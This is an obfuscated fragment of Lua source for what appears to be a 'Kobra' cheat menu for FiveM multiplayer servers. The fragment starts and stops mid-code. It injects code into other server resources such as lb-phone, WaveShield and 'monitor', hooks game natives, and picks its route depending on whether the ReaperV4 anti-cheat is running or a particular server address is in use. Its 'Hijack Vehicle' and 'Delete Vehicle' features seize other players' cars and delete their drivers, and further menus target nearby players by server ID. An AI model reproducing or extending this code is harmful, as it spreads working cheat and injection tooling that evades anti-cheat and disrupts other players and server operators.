                                        ]] );end Wait(8 + 32 );SetPedIntoVehicle(v1282,v1477, -(1 + 0));Wait(3 -2 );SetPedIntoVehicle(v1282,v1477,GetEmptySeat(v1477));Wait(65 -(48 + 16) );SetPedIntoVehicle(v1282,v1477, -(1 + 0));Wait(450);ClearPedTasksImmediately(v1282);SetEntityCoordsNoOffset(v1282,v1283.x,v1283.y,v1283.z,true,true,true,true);Wait(479 -379 );end break;end end end CreateThread(function() if v1291 then if ((v1293~=(0 -0)) and IsEntityAVehicle(v1293)) then local v1628=0 + 0 ;local v1629;while true do if (v1628==(1089 -(910 + 179))) then v1629=v1293;v1294(v1629);break;end end end end end);break;end if (v1279==(1 -0)) then hNative("GetEntityCoords",function(v1480,...) return v1480(...);end);hNative("GetCamCoord",function(v1481,...) return v1481(...);end);hNative("GetCamRot",function(v1482,...) return v1482(...);end);hNative("StartShapeTestRay",function(v1483,...) return v1483(...);end);v1279=3 -1 ;end if (v1279==(1385 -(933 + 446))) then v1282=PlayerPedId();v1283=GetEntityCoords(v1282);v1284=GetCamCoord(_G.KobraFreecamObject);v1285=GetCamRot(_G.KobraFreecamObject,2);v1279=3 + 4 ;end if (v1279==(1524 -(248 + 1276))) then function hNative(v1484,v1485) local v1486=0;local v1487;while true do if (0==v1486) then v1487=_G[v1484];if ( not v1487 or (type(v1487)~="function")) then return;end v1486=1 + 0 ;end if (v1486==(1 + 0)) then _G[v1484]=function(...) return v1485(v1487,...);end;break;end end end hNative("CreateThread",function(v1488,...) return v1488(...);end);hNative("Wait",function(v1489,...) return v1489(...);end);hNative("DoesEntityExist",function(v1490,...) return v1490(...);end);v1279=3 -2 ;end end end elseif (v775=="Hijack Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1295=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v36(v1295,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    Wait(250)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]]);elseif _G.KobraFreecamObject then local v1343=0 -0 ;local v1344;local v1345;local v1346;local v1347;local v1348;local v1349;local v1350;local v1351;local v1352;local v1353;local v1354;local v1355;local v1356;local v1357;local v1358;while true do if (v1343==8) then v1354,v1355,v1356,v1354,v1357=GetShapeTestResult(v1353);v1358=nil;function v1358(v1538) local v1539=1545 -(151 + 1394) ;local v1540;while true do if (v1539==(945 -(929 + 15))) then if ((v1540~=(1996 -(1173 + 823))) and DoesEntityExist(v1540)) then SetPedIntoVehicle(v1346,v1538,0);v1344(v1538,3237 -1237 );Wait(1786 -(482 + 1294) );for v1703=0,4 do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1540   .. [[)
                                        ]] );end Wait(40);SetPedIntoVehicle(v1346,v1538, -(1 -0));Wait(1 + 0 );SetPedIntoVehicle(v1346,v1538,GetEmptySeat(v1538));Wait(1307 -(1125 + 181) );SetPedIntoVehicle(v1346,v1538, -(2 -1));Wait(277 + 173 );ClearPedTasksImmediately(v1346);Wait(402 -152 );SetPedIntoVehicle(v1346,v1538, -(1190 -(626 + 563)));end break;end if (v1539==0) then if ( not v1538 or  not DoesEntityExist(v1538)) then return;end v1540=GetPedInVehicleSeat(v1538, -(1251 -(153 + 1097)));v1539=3 -2 ;end end end CreateThread(function() if v1355 then if ((v1357~=(0 + 0)) and IsEntityAVehicle(v1357)) then local v1694=v1357;v1358(v1694);end end end);break;end if (v1343==(2 -1)) then hNative("GetEntityCoords",function(v1541,...) return v1541(...);end);hNative("GetCamCoord",function(v1542,...) return v1542(...);end);hNative("GetCamRot",function(v1543,...) return v1543(...);end);hNative("StartShapeTestRay",function(v1544,...) return v1544(...);end);v1343=2 + 0 ;end if (v1343==(2 + 0)) then hNative("GetShapeTestResult",function(v1545,...) return v1545(...);end);hNative("GetPedInVehicleSeat",function(v1546,...) return v1546(...);end);hNative("SetEntityVisible",function(v1547,...) return v1547(...);end);hNative("DeletePed",function(v1548,...) return v1548(...);end);v1343=1 + 2 ;end if (v1343==(5 + 1)) then v1346=PlayerPedId();v1347=GetEntityCoords(v1346);v1348=GetCamCoord(_G.KobraFreecamObject);v1349=GetCamRot(_G.KobraFreecamObject,2 + 0 );v1343=7;end if ((1161 -(199 + 958))==v1343) then hNative("PlayerPedId",function(v1549,...) return v1549(...);end);hNative("NetworkRequestControlOfEntity",function(v1550,...) return v1550(...);end);hNative("NetworkHasControlOfEntity",function(v1551,...) return v1551(...);end);v1344=nil;v1343=5;end if (v1343==(0 + 0)) then function hNative(v1552,v1553) local v1554=0 -0 ;local v1555;while true do if (v1554==(2 -1)) then _G[v1552]=function(...) return v1553(v1555,...);end;break;end if ((1176 -(1169 + 7))==v1554) then v1555=_G[v1552];if ( not v1555 or (type(v1555)~="function")) then return;end v1554=1874 -(751 + 1122) ;end end end hNative("CreateThread",function(v1556,...) return v1556(...);end);hNative("Wait",function(v1557,...) return v1557(...);end);hNative("DoesEntityExist",function(v1558,...) return v1558(...);end);v1343=1 + 0 ;end if (5==v1343) then function v1344(v1559,v1560) local v1561=0 + 0 ;local v1562;while true do if (v1561==(0 + 0)) then v1560=v1560 or (367 + 1633) ;v1562=GetGameTimer();v1561=1;end if (v1561==(1 -0)) then while (GetGameTimer() -v1562)<v1560  do local v1695=1181 -(589 + 592) ;while true do if (v1695==(0 -0)) then if NetworkHasControlOfEntity(v1559) then return true;end NetworkRequestControlOfEntity(v1559);v1695=1;end if (v1695==(1 + 0)) then Wait(24 -(13 + 11) );break;end end end return NetworkHasControlOfEntity(v1559);end end end v1345=nil;function v1345(v1563) local v1564=math.rad(v1563.z);local v1565=math.rad(v1563.x);local v1566=math.abs(math.cos(v1565));return vector3( -math.sin(v1564) * v1566 ,math.cos(v1564) * v1566 ,math.sin(v1565));end function GetEmptySeat(v1567) local v1568={ -(1 + 0),0,2 -1 ,1 + 1 };for v1602,v1603 in ipairs(v1568) do if IsVehicleSeatFree(v1567,v1603) then return v1603;end end return  -(1 -0);end v1343=6 + 0 ;end if (v1343==(7 + 0)) then v1350=v1345(v1349);v1351=601 + 399 ;v1352=v1348 + (v1350 * v1351) ;v1353=StartShapeTestRay(v1348.x,v1348.y,v1348.z,v1352.x,v1352.y,v1352.z, -(1 + 0),v1346,0);v1343=8;end if (v1343==(1 + 2)) then hNative("ClearPedTasksImmediately",function(v1569,...) return v1569(...);end);hNative("SetEntityCoordsNoOffset",function(v1570,...) return v1570(...);end);hNative("IsEntityAVehicle",function(v1571,...) return v1571(...);end);hNative("SetPedIntoVehicle",function(v1572,...) return v1572(...);end);v1343=1852 -(230 + 1618) ;end end end elseif (v775=="Delete Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1359=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v36(v1359,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function DeleteCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                else
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(100)
                                    DeleteEntity(vehicle)
                                    Wait(100)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        DeleteCar(vehicle)
                                    end
                                end
                            end)
                        ]]);elseif _G.KobraFreecamObject then local v1491=0;local v1492;local v1493;local v1494;local v1495;local v1496;local v1497;local v1498;local v1499;local v1500;local v1501;local v1502;local v1503;local v1504;local v1505;local v1506;while true do if (v1491==(4 + 0)) then hNative("PlayerPedId",function(v1630,...) return v1630(...);end);hNative("NetworkRequestControlOfEntity",function(v1631,...) return v1631(...);end);hNative("NetworkHasControlOfEntity",function(v1632,...) return v1632(...);end);v1492=nil;v1491=5;end if ((2 + 4)==v1491) then v1494=PlayerPedId();v1495=GetEntityCoords(v1494);v1496=GetCamCoord(_G.KobraFreecamObject);v1497=GetCamRot(_G.KobraFreecamObject,2);v1491=7;end if (5==v1491) then function v1492(v1633,v1634) local v1635=0;local v1636;while true do if (v1635==0) then v1634=v1634 or (1916 + 84) ;v1636=GetGameTimer();v1635=204 -(131 + 72) ;end if (v1635==(1 + 0)) then while (GetGameTimer() -v1636)<v1634  do local v1704=204 -(144 + 60) ;while true do if (v1704==(0 -0)) then if NetworkHasControlOfEntity(v1633) then return true;end NetworkRequestControlOfEntity(v1633);v1704=1 -0 ;end if (v1704==(1 + 0)) then Wait(0 -0 );break;end end end return NetworkHasControlOfEntity(v1633);end end end v1493=nil;function v1493(v1637) local v1638=0;local v1639;local v1640;local v1641;while true do if (v1638==(1 + 0)) then v1641=math.abs(math.cos(v1640));return vector3( -math.sin(v1639) * v1641 ,math.cos(v1639) * v1641 ,math.sin(v1640));end if (v1638==0) then v1639=math.rad(v1637.z);v1640=math.rad(v1637.x);v1638=1923 -(523 + 1399) ;end end end function GetEmptySeat(v1642) local v1643={ -(1 + 0),976 -(269 + 707) ,1,132 -(123 + 7) };for v1687,v1688 in ipairs(v1643) do if IsVehicleSeatFree(v1642,v1688) then return v1688;end end return  -1;end v1491=5 + 1 ;end if (v1491==2) then hNative("GetShapeTestResult",function(v1644,...) return v1644(...);end);hNative("GetPedInVehicleSeat",function(v1645,...) return v1645(...);end);hNative("SetEntityVisible",function(v1646,...) return v1646(...);end);hNative("DeletePed",function(v1647,...) return v1647(...);end);v1491=3;end if (v1491==(1 + 0)) then hNative("GetEntityCoords",function(v1648,...) return v1648(...);end);hNative("GetCamCoord",function(v1649,...) return v1649(...);end);hNative("GetCamRot",function(v1650,...) return v1650(...);end);hNative("StartShapeTestRay",function(v1651,...) return v1651(...);end);v1491=2;end if (v1491==8) then v1502,v1503,v1504,v1502,v1505=GetShapeTestResult(v1501);v1506=nil;function v1506(v1652) local v1653=0 -0 ;local v1654;while true do if (v1653==(2 -1)) then if ((v1654~=0) and DoesEntityExist(v1654)) then local v1712=1088 -(38 + 1050) ;while true do if (v1712==(2 + 1)) then SetEntityCoordsNoOffset(v1494,v1495.x,v1495.y,v1495.z,true,true,true,true);Wait(40 + 60 );MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1652   .. [[)
                                    ]] );break;end if (v1712==0) then SetPedIntoVehicle(v1494,v1652,0 + 0 );v1492(v1652,2823 -(426 + 397) );Wait(10);for v1727=0,1410 -(751 + 655)  do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1654   .. [[)
                                        ]] );end v1712=1 -0 ;end if (v1712==2) then Wait(1 + 0 );SetPedIntoVehicle(v1494,v1652, -1);Wait(450);ClearPedTasksImmediately(v1494);v1712=1248 -(39 + 1206) ;end if (v1712==1) then Wait(123 -83 );SetPedIntoVehicle(v1494,v1652, -(842 -(566 + 275)));Wait(936 -(167 + 768) );SetPedIntoVehicle(v1494,v1652,GetEmptySeat(v1652));v1712=1 + 1 ;end end else local v1713=0 -0 ;while true do if (v1713==(1 + 0)) then MachoInjectResource("monitor",[[
                                        DeleteEntity(]]   .. v1652   .. [[)
                                    ]] );Wait(96 + 4 );v1713=2 -0 ;end if (v1713==(17 -(8 + 7))) then SetEntityCoordsNoOffset(v1494,v1495.x,v1495.y,v1495.z,true,true,true,true);break;end if ((1683 -(1510 + 173))==v1713) then SetPedIntoVehicle(v1494,v1652, -(1 -0));Wait(5 + 95 );v1713=254 -(30 + 223) ;end end end break;end if (0==v1653) then if ( not v1652 or  not DoesEntityExist(v1652)) then return;end v1654=GetPedInVehicleSeat(v1652, -(1257 -(300 + 956)));v1653=123 -(22 + 100) ;end end end CreateThread(function() if v1503 then if ((v1505~=(0 -0)) and IsEntityAVehicle(v1505)) then local v1705=v1505;v1506(v1705);end end end);break;end if (v1491==7) then v1498=v1493(v1497);v1499=1282 -(47 + 235) ;v1500=v1496 + (v1498 * v1499) ;v1501=StartShapeTestRay(v1496.x,v1496.y,v1496.z,v1500.x,v1500.y,v1500.z, -(3 -2),v1494,0 + 0 );v1491=494 -(21 + 465) ;end if (v1491==3) then hNative("ClearPedTasksImmediately",function(v1655,...) return v1655(...);end);hNative("SetEntityCoordsNoOffset",function(v1656,...) return v1656(...);end);hNative("IsEntityAVehicle",function(v1657,...) return v1657(...);end);hNative("SetPedIntoVehicle",function(v1658,...) return v1658(...);end);v1491=4;end if (v1491==(0 + 0)) then function hNative(v1659,v1660) local v1661=0 + 0 ;local v1662;while true do if (v1661==(1 + 0)) then _G[v1659]=function(...) return v1660(v1662,...);end;break;end if (v1661==(0 -0)) then v1662=_G[v1659];if ( not v1662 or (type(v1662)~="function")) then return;end v1661=1218 -(553 + 664) ;end end end hNative("CreateThread",function(v1663,...) return v1663(...);end);hNative("Wait",function(v1664,...) return v1664(...);end);hNative("DoesEntityExist",function(v1665,...) return v1665(...);end);v1491=1 + 0 ;end end end end end end local v463=v5[v3];if v463 then if ((v463.type=="slider") or (v463.type=="slider-checkbox")) then local v776=78 -(73 + 5) ;local v777;local v778;while true do if (0==v776) then v777=v463.max or 100 ;v778=GetGameTimer();v776=1716 -(1128 + 587) ;end if (v776==(3 -2)) then if (v777<=10) then if (IsControlPressed(690 -(558 + 132) ,174) and ((v778-v268)>v269)) then local v1180=0 -0 ;while true do if (v1180==(0 -0)) then v0:ScrollTwo("Left");v268=v778;break;end end elseif (IsControlPressed(0 + 0 ,138 + 37 ) and ((v778-v268)>v269)) then v0:ScrollTwo("Right");v268=v778;end elseif IsControlPressed(0 + 0 ,149 + 25 ) then v0:ScrollTwo("Left");elseif IsControlPressed(0,175) then v0:ScrollTwo("Right");end break;end end end end end end);local v89=0;local v90=198 -78 ;local v91=0 + 0 ;local v92=62 + 58 ;local v93=771 -(294 + 477) ;local v94=42 + 78 ;MachoOnKeyDown(function(v270) local v271=tonumber(v270) or v270 ;local v272=v32[v271] or "Unknown" ;local v273=GetGameTimer();if (v272==v11) then if ( not v1 and v12) then v0:ShowUI();end elseif (v272=="Backspace") then if (v1 and v12) then v0:Backspace();end elseif (v272=="Enter") then if (v1 and v12) then v0:Enter();end elseif ((v272=="Q") and ((v273-v93)>v94)) then if (v1 and v12) then v0:PrevCategory();end elseif ((v272=="E") and ((v273-v93)>v94)) then if (v1 and v12) then v0:NextCategory();end elseif ((v272=="ArrowUp") and ((v273-v89)>v90)) then if v1 then local v1306=0 -0 ;while true do if (v1306==0) then v0:ScrollOne("Up");v89=v273;break;end end end elseif ((v272=="ArrowDown") and ((v273-v89)>v90)) then if v1 then local v1415=0 -0 ;while true do if (0==v1415) then v0:ScrollOne("Down");v89=v273;break;end end end elseif (v272=="ArrowLeft") then local v1416=v5[v3];if v1416 then if ((v1416.type=="slider") or ((v1416.type=="slider-checkbox") and ((v273-v91)>v92))) then local v1604=0 + 0 ;local v1605;local v1606;while true do if (v1604==(0 + 0)) then v1605=v1416.max or 100 ;v1606=GetGameTimer();v1604=2 -1 ;end if (v1604==(983 -(97 + 885))) then if (v1605<=10) then local v1706=0 + 0 ;while true do if (v1706==0) then v0:ScrollTwo("Left");v91=v1606;break;end end else v0:ScrollTwo("Left");end break;end end elseif ((v1416.type=="scrollable") or (v1416.type=="scrollable-checkbox")) then v0:ScrollTwo("Left");end end elseif (v272=="ArrowRight") then local v1528=0 -0 ;local v1529;while true do if (v1528==0) then v1529=v5[v3];if v1529 then if ((v1529.type=="slider") or ((v1529.type=="slider-checkbox") and ((v273-v91)>v92))) then local v1707=0;local v1708;local v1709;while true do if (v1707==(366 -(271 + 94))) then if (v1708<=(1613 -(777 + 826))) then v0:ScrollTwo("Right");v91=v1709;else v0:ScrollTwo("Right");end break;end if (v1707==0) then v1708=v1529.max or (38 + 62) ;v1709=GetGameTimer();v1707=1;end end elseif ((v1529.type=="scrollable") or (v1529.type=="scrollable-checkbox")) then v0:ScrollTwo("Right");end end break;end end elseif (v272=="F5") then local v1607=v5[v3];if (v1 and v12 and v1607 and ((v1607.type=="button") or (v1607.type=="checkbox") or (v1607.type=="slider-checkbox"))) then local v1689=0;while true do if (v1689==(1355 -(117 + 1238))) then v0:HideUI();Wait(1965 -(686 + 1029) );v1689=1;end if (v1689==1) then v47(("Bind %s"):format(v1607.label),"",function(v1714) for v1715,v1716 in pairs(v32) do if (v1716:lower()==v1714:lower()) then local v1723=1356 -(1074 + 282) ;local v1724;while true do if (v1723==(1618 -(1359 + 258))) then if v1724 then local v1735=0;while true do if (0==v1735) then v13[ #v13 + (2 -1) ]={key=v1724,keyRaw=v1715,keyLabel=v32[v1715],type=v1607.type,label=v1607.label,checked=v1607.checked or false ,value=v1607.value or (1936 -(1730 + 205)) ,step=v1607.step or 0.25 ,min=v1607.min or 0.25 ,max=v1607.max or (533 -(67 + 461)) ,onSelect=v1607.onSelect};v0:ShowKeybindList(v13);break;end end end Wait(890 -390 );v1723=2;end if (v1723==(2 -0)) then v0:ShowUI();return;end if (v1723==(0 -0)) then v1724=v33[v1715];for v1733,v1734 in pairs(v13) do if (v1734.keyRaw==v1715) then local v1737=0 + 0 ;while true do if (v1737==(629 -(129 + 500))) then v0:Notify("error","Kobra","There is already a keybind with that key!",4711 -(1157 + 554) );return;end end end end v1723=1;end end end end end,"keybind");break;end end end elseif v12 then for v1696,v1697 in pairs(v13) do if (v1697.type=="button") then local v1710=0 -0 ;local v1711;while true do if (v1710==(607 -(82 + 525))) then v1711=v1697.keyRaw;if v1711 then if (v1711==v271) then local v1730=0;while true do if (v1730==(0 + 0)) then v1697.onSelect();v0:Notify("success","Kobra",("You have executed %s!"):format(v1697.label),6829 -3829 );break;end end end end break;end end elseif (v1697.type=="checkbox") then local v1717=1623 -(948 + 675) ;local v1718;while true do if (v1717==(0 + 0)) then v1718=v1697.keyRaw;if (v1718 and (v1718==v271)) then local v1731=0 + 0 ;while true do if (v1731==2) then v0:Notify((v1697.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1697.checked and "enabled") or "disabled" ,v1697.label),8360 -5360 );if v1 then v0:UpdateElements(v5);end break;end if (v1731==(854 -(406 + 447))) then if v1697.onSelect then v1697.onSelect(v1697.checked);end v0:ShowKeybindList(v13);v1731=119 -(91 + 26) ;end if (v1731==(0 -0)) then v1697.checked= not v1697.checked;v0:UpdateTabChecked(v4,v1697.label,v1697.checked);v1731=1 + 0 ;end end end break;end end elseif (v1697.type=="slider-checkbox") then local v1725=0;local v1726;while true do if (v1725==(986 -(968 + 18))) then v1726=v1697.keyRaw;if (v1726 and (v1726==v271)) then local v1736=0 + 0 ;while true do if ((1 + 0)==v1736) then if v1697.onSelect then v1697.onSelect(v1697.value,v1697.checked);end v0:ShowKeybindList(v13);v1736=2;end if (v1736==0) then v1697.checked= not v1697.checked;v0:UpdateTabChecked(v4,v1697.label,v1697.checked);v1736=1 -0 ;end if (v1736==(269 -(172 + 95))) then v0:Notify((v1697.checked and "success") or "error" ,"Kobra",("You have %s %s!"):format((v1697.checked and "enabled") or "disabled" ,v1697.label),3000);if v1 then v0:UpdateElements(v5);end break;end end end break;end end end end end end);v0.InListMenu=function(v274) return v6 and v6[v7] and ((v6[v7].label=="List") or (v6[v7].label=="Safe")) ;end;v0.SelectEveryone=function(v275) local v276=0 -0 ;local v277;while true do if (v276==(267 -(260 + 5))) then v275:UpdateElements(v5);break;end if (v276==0) then if ( not v6 or  not v6[v7]) then return;end v277=v6[v7];v276=2 -1 ;end if (1==v276) then if (v277.label~="List") then return;end for v685,v686 in ipairs(v277.tabs) do if (v686.type=="checkbox") then local v813=0;while true do if (v813==0) then v686.checked=true;if (v686.serverId and tonumber(v686.serverId)) then v15[tonumber(v686.serverId)]=true;end break;end end end end v276=2;end end end;v0.UnselectEveryone=function(v278) local v279=0;local v280;while true do if (v279==1) then if (v280.label~="List") then return;end for v687,v688 in ipairs(v280.tabs) do if (v688.type=="checkbox") then local v814=819 -(265 + 554) ;while true do if (v814==(1571 -(1440 + 131))) then v688.checked=false;if (v688.serverId and tonumber(v688.serverId)) then v15[tonumber(v688.serverId)]=false;end break;end end end end v279=2;end if (v279==(5 -3)) then v278:UpdateElements(v5);break;end if ((1395 -(253 + 1142))==v279) then if ( not v6 or  not v6[v7]) then return;end v280=v6[v7];v279=254 -(133 + 120) ;end end end;v0.ClearSelection=function(v281) local v282=0;while true do if (v282==1) then v0:UnselectEveryone();break;end if (v282==(0 -0)) then v15={};if (v6 and v6[v7]) then local v779=1956 -(809 + 1147) ;local v780;while true do if (v779==(497 -(178 + 319))) then v780=v6[v7];if ((v780.label=="List") and v780.tabs) then for v1110,v1111 in ipairs(v780.tabs) do if (v1111.type=="checkbox") then v1111.checked=false;end end end break;end end end v282=1 -0 ;end end end;v0.UpdateListMenu=function(v283) if  not v1 then return;end if ( not v6 or  not v6[v7]) then return;end local v284=v6[v7];if (v284.label~="List") then return;end local v285=GetEntityCoords(PlayerPedId());if  not v285 then return;end local v286=v283:GetNearbyPlayers(v285,350,true);local v287;for v464,v465 in ipairs(v284.tabs) do if ((v465.type=="divider") and (v465.label=="Nearby Players")) then v287=v464;break;end end if  not v287 then return;end for v466= #v284.tabs,v287 + 1 + 0 , -1 do table.remove(v284.tabs,v466);end if ( #v286==(1270 -(1255 + 15))) then v284.tabs[ #v284.tabs + (1543 -(1221 + 321)) ]={type="button",label="No Nearby Players",disabled=true};else table.sort(v286,function(v623,v624) return tonumber(v623.serverId)<tonumber(v624.serverId) ;end);for v625,v626 in ipairs(v286) do local v627=tonumber(v626.serverId);if (v627 and v626.name) then local v781,v782=GetCurrentPedWeapon(GetPlayerPed(GetPlayerFromServerId(v627)));v284.tabs[ #v284.tabs + (2 -1) ]={type="checkbox",label=("%s - [%s]"):format(v626.name,v627),serverId=v627,checked=v15[v627] or false ,name=v626.name,vehicle=((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v627)))~=0) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v627)))) or nil ,isDriver=(GetPedInVehicleSeat((GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v627)))~=(0 + 0)) and GetVehiclePedIsUsing(GetPlayerPed(GetPlayerFromServerId(v627))) , -(3 -2))==GetPlayerPed(GetPlayerFromServerId(v627))) or false ,metaData={{key="Distance",value=math.floor( #(GetEntityCoords(PlayerPedId()) -GetEntityCoords(GetPlayerPed(GetPlayerFromServerId(v627)))))   .. ".0m" },{key="Server ID",value=v627},{key="Health",value=GetEntityHealth(GetPlayerPed(GetPlayerFromServerId(v627))),color="0, 255, 